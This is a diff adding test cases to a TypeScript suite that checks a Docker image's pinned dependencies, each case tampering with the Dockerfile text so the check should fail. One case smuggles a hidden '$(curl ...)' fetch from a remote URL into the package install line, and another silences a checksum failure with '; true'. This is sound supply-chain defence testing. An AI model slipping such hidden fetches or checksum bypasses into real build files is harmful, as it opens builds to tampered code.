@@ -140,6 +140,39 @@ describe("the renderer image's pins", () => {
         ),
     ],
     [
+      "a curl hidden in a command substitution on the install line",
+      (text: string) =>
+        text.replace(
+          "ca-certificates curl unzip fontconfig",
+          'ca-certificates curl unzip fontconfig $(curl -fsSL "https://example.org/x")',
+        ),
+    ],
+    [
+      "a checksum failure swallowed by a later command",
+      (text: string) =>
+        text.replace(
+          'echo "${CHROME_SHA256}  chrome-headless-shell-linux64.zip" | sha256sum --check -',
+          'echo "${CHROME_SHA256}  chrome-headless-shell-linux64.zip" | sha256sum --check - ; true',
+        ),
+    ],
+    [
+      "an apt-get download",
+      (text: string) =>
+        text.replace(
+          "rm -rf /var/lib/apt/lists/*",
+          "apt-get download libfoo; rm -rf /var/lib/apt/lists/*",
+        ),
+    ],
+    [
+      "a COPY from another image",
+      (text: string) =>
+        text.replace(
+          "USER node",
+          `COPY --from=busybox@sha256:${"0".repeat(64)} /bin/sh /bin/sh\nUSER node`,
+        ),
+    ],
+    ["any ADD", (text: string) => text.replace("USER node", "ADD local.tar /opt/\nUSER node")],
+    [
       "a malformed snapshot",
       (text: string) => text.replace(/ARG DEBIAN_SNAPSHOT=\S+/, "ARG DEBIAN_SNAPSHOT=latest"),
     ],
